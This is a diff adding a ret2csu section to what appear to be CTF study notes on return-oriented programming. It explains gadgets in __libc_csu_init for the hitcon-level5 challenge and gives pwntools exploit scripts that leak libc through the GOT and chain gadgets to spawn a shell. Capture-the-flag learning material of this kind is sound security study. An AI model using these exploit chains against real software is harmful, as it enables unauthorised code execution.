@@ -141,6 +141,97 @@ One more important thing needed to care about is `MOVAPS` issue in `system` func
 
 > When you try to use makefile to compile the example file, remember it is dynamic linking. To find the libc linked to the binary, you need to use ldd to check the path of libc and specify in your exploit!
 
+# ret2csu(`/file/ret2csu/`)
+The source code and binary can be found in [ctf-wiki/hitcon-level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5). In this challenge, we will learn that `__libc_csu_init` has gadgets that can help us to control registers not limited to `rdi`, `rsi`, `rdx`. How do we hijack the control flow with these gadgets? We can separate it to two chains in this function:  
+```asm
+# foot step 1
+.text:0000000000400600                 mov     rdx, r13
+.text:0000000000400603                 mov     rsi, r14
+.text:0000000000400606                 mov     edi, r15d
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]
+.text:000000000040060D                 add     rbx, 1
+.text:0000000000400611                 cmp     rbx, rbp
+.text:0000000000400614                 jnz     short loc_400600
+.text:0000000000400616                 add     rsp, 8
+# foot step 2
+.text:000000000040061A                 pop     rbx
+.text:000000000040061B                 pop     rbp
+.text:000000000040061C                 pop     r12
+.text:000000000040061E                 pop     r13
+.text:0000000000400620                 pop     r14
+.text:0000000000400622                 pop     r15
+.text:0000000000400624                 retn
+```
+In our ROP chain, we can return to `foot step 2` first. Here we can control the contents of `rbx`, `rbp`, `r12`, `r13`, `r14`, `r15`, and also overwrite the return address with `foot step 1`. Then, we can indirectly control the contents of `rdx`, `rsi`, and `edi`(which is the lower 32 bits of rdi). `call qword ptr` gadget can help us call a function we want, so we will overwrite `r12` with the function address we want. To avoid triggering `jnz` instruction, we would make it simple to make `rbx = 0` and `rbp = 1`. Then the control flow will continue on foot step 2 again. Remember to fill in some junk data here (from `0x40061A` to `0x400622`), then you can overwrite the return address again!  
+Exploit can be found in `/file/ret2csu`, and the first version of exploit failed:
+```py
+from pwn import *
+
+context.arch = "amd64"
+
+r = process("./level5")
+elf = ELF("./level5")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+read_got = elf.got['read']
+write_got = elf.got['write']
+bss_base = elf.bss()
+main_addr = elf.sym.main
+
+csu_gadget1 = 0x400600
+csu_gedget2 = 0x40061A
+
+def ret2csu(rbx, rbp, r12, r13, r14, r15, backto):
+    # we will use two parts csu gadget
+    p = flat('a' * 0x88,
+            csu_gedget2,
+            rbx, rbp, r12, r13, r14, r15,
+            csu_gadget1,
+            'a' * 0x38,    # junk data
+            backto)
+    r.sendline(p)
+    sleep(1)
+
+r.recvline()
+
+# call qword ptr [r12 + rbx*8]
+# overwrite r12 with the address of write_got
+ret2csu(0, 1, write_got, 8, write_got, 1, main_addr)
+
+write_addr = u64(r.recv(8))
+write_off = libc.sym.write
+libc.address = write_addr - write_off
+success( 'libc base address => %s' % hex(libc.address) )
+success( 'system address => %s' % hex(libc.sym.system) )
+
+bin_sh = libc.search('/bin/sh').next()
+success( 'binsh address => %s' % hex(bin_sh) )
+
+r.recvline()
+
+ret2csu(0, 1, libc.sym.system, 0, 0, bin_sh, main_addr)
+
+r.interactive()
+```
+The reason for the failure here is the incorrect address of string `/bin/sh`. Take a look at following debug process,  
+<img src = "./file/ret2csu/system_failure.png" width = "50%" height = "50%"/>  
+The gadget which is `mov edi, r15d` can only help us control lower 32 bits of rdi. Therefore, I turn to write the string into bss and call `execve()`. The final working exploit can be found in `/file/ret2csu/exp.py`.
+```py
+# read(0, bss_base, 16)
+ret2csu(0, 1, read_got, 16, bss_base, 0, main_addr)
+r.send(p64(libc.sym.execve) + '/bin/sh\x00')
+
+r.recvline()
+
+# system(/bin/sh)
+ret2csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
+```
+`bss_base` shows the address of `execve` while `bss_base + 8` is the address of `/bin/sh`.  
+
+We can find that the length of the payload is very long. How if we are not able to give such a long payload? We can try to excavate some other gadgets in `_init`, `_start`, `call_gmon_start`, `deregister_tm_clones`, `register_tm_clones`, `__do_global_dtors_aux`, `frame_dummy`, `__libc_csi_fini` or `_fini`, These are some other functions added by compiler.  
+
+Also do not try finding gadgets only based on the start address in the assembly code. Assume that the shown starting address is `0x400621`, then the instruction might be totally different from what you see before if you try `x/i 0x400622`.
+
 ## Practice  
 Kinds of ROP | practice link  
 ------------ | --------------  
